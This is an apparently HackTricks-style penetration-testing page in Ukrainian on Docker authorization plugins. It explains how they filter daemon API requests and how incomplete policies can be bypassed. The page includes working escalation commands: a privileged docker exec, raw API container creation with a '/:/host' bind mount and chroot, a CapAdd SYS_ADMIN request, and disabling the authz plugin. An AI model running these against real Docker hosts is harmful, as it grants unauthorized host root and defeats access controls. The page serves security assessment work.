# Плагіни авторизації під час виконання

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Плагіни авторизації під час виконання — це додатковий рівень політик, який визначає, чи може caller виконати певну дію демона. Docker — класичний приклад. За замовчуванням будь-хто, хто може взаємодіяти з Docker daemon, фактично отримує широкий контроль над ним. Плагіни авторизації намагаються звузити цю модель, перевіряючи автентифікованого користувача та запитану API-операцію, а потім дозволяючи або забороняючи запит відповідно до політики.

Ця тема заслуговує на окрему сторінку, оскільки вона змінює модель exploitation, коли attacker уже має доступ до Docker API або до користувача в групі `docker`. У таких середовищах питання вже не лише в тому, «чи можу я підключитися до daemon?», а й у тому, «чи захищений daemon authorization layer, і якщо так, чи можна обійти цей layer через необроблені endpoints, слабкий JSON parsing або permissions на керування плагінами?»

## Робота

Коли запит досягає Docker daemon, authorization subsystem може передати контекст запиту одному або кільком встановленим плагінам. Плагін бачить ідентичність автентифікованого користувача, деталі запиту, вибрані headers, а також частини body запиту або відповіді, якщо content type є придатним. Кілька плагінів можна об'єднати в chain, і доступ надається лише тоді, коли всі плагіни дозволяють запит.

Ця модель звучить надійно, але її безпека повністю залежить від того, наскільки повно автор політики зрозумів API. Плагін, який блокує `docker run --privileged`, але ігнорує `docker exec`, пропускає alternate JSON keys, як-от top-level `Binds`, або дозволяє plugin administration, може створити хибне відчуття обмеження, водночас залишаючи відкритими прямі шляхи до privilege escalation.

## Типові цілі плагінів

Важливі області для policy review:

- endpoints створення контейнерів
- поля `HostConfig`, такі як `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` та options спільного використання namespaces
- поведінка `docker exec`
- endpoints керування плагінами
- будь-який endpoint, який може опосередковано запускати runtime actions поза межами передбаченої policy model

Історично такі приклади, як плагін `authz` від Twistlock і прості educational plugins, наприклад `authobot`, спрощували вивчення цієї моделі, оскільки їхні policy files і code paths показували, як насправді реалізовувалося зіставлення endpoint-to-action. Для assessment роботи важливо розуміти, що автор політики має знати всю API surface, а не лише найпомітніші CLI commands.

## Зловживання

Перша мета — з'ясувати, що саме блокується. Якщо daemon забороняє дію, помилка часто leak-ить назву плагіна, що допомагає визначити використовуваний control:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Якщо вам потрібне ширше профілювання endpoint, такі інструменти, як `docker_auth_profiler`, будуть корисними, оскільки вони автоматизують інакше повторюване завдання перевірки того, які API-маршрути та JSON-структури насправді дозволені плагіном.

Якщо в середовищі використовується custom plugin і ви можете взаємодіяти з API, перелічіть, які поля об’єктів насправді фільтруються:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ці перевірки важливі, оскільки багато помилок авторизації стосуються конкретних полів, а не концепцій загалом. Plugin може відхилити шаблон CLI, не блокуючи повністю еквівалентну структуру API.

### Повний приклад: `docker exec` додає привілеї після створення контейнера

Політику, яка блокує створення privileged-контейнерів, але дозволяє створення unconfined-контейнерів разом із `docker exec`, усе ще можна обійти:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Якщо daemon приймає другий крок, користувач отримує привілейований інтерактивний процес усередині контейнера, який автор політики вважав обмеженим.

### Повний приклад: Bind Mount через Raw API

Деякі зламані політики перевіряють лише одну структуру JSON. Якщо bind mount кореневої файлової системи не блокується послідовно, хост усе ще можна змонтувати:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Та сама ідея також може зустрічатися в `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Вплив полягає в повному виході до файлової системи host. Цікава деталь полягає в тому, що обхід виникає через неповне охоплення policy, а не через помилку в kernel.

### Повний приклад: неперевірений атрибут Capability

Якщо policy забуває фільтрувати атрибут, пов’язаний із capability, зловмисник може створити контейнер, який повторно отримує небезпечну capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Після появи `CAP_SYS_ADMIN` або аналогічної потужної capability стають доступними багато технік виходу з контейнера, описаних у [capabilities.md](protections/capabilities.md) і [privileged-containers.md](privileged-containers.md).

### Повний приклад: вимкнення плагіна

Якщо дозволені операції керування плагінами, найпростішим обходом може бути повне вимкнення цього контролю:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Це збій політики на рівні control-plane. Рівень авторизації існує, але користувач, якого він мав обмежувати, усе ще має дозвіл його вимкнути.

## Перевірки

Ці команди призначені для визначення того, чи існує рівень політик і чи здається він повним, а не поверхневим.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Що тут є цікавого:

- Повідомлення про відмову, які містять назву plugin, підтверджують наявність authorization layer і часто розкривають точну реалізацію.
- Список plugin, видимий attacker, може бути достатнім для визначення можливості виконання операцій disable або reconfigure.
- Policy, яка блокує лише очевидні CLI-дії, але не raw API-запити, має вважатися bypassable, доки не доведено протилежне.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Не enabled by default | Доступ до daemon фактично працює за принципом all-or-nothing, якщо не налаштовано authorization plugin | неповна plugin policy, blacklists замість allowlists, дозвіл на plugin management, blind spots на рівні полів |
| Podman | Не має поширеного direct equivalent | Podman зазвичай більше покладається на Unix permissions, rootless execution і рішення щодо API exposure, ніж на authz plugins у стилі Docker | широке exposing rootful Podman API, слабкі socket permissions |
| containerd / CRI-O | Інша control model | Ці runtimes зазвичай покладаються на socket permissions, node trust boundaries і controls оркестратора вищого рівня, а не на Docker authz plugins | mounting socket у workloads, слабкі node-local trust assumptions |
| Kubernetes | Використовує authn/authz на рівнях API-server і kubelet, а не Docker authz plugins | Cluster RBAC і admission controls є основним policy layer | надто широкі RBAC, слабка admission policy, пряме exposing kubelet або runtime APIs |
{{#include ../../../banners/hacktricks-training.md}}
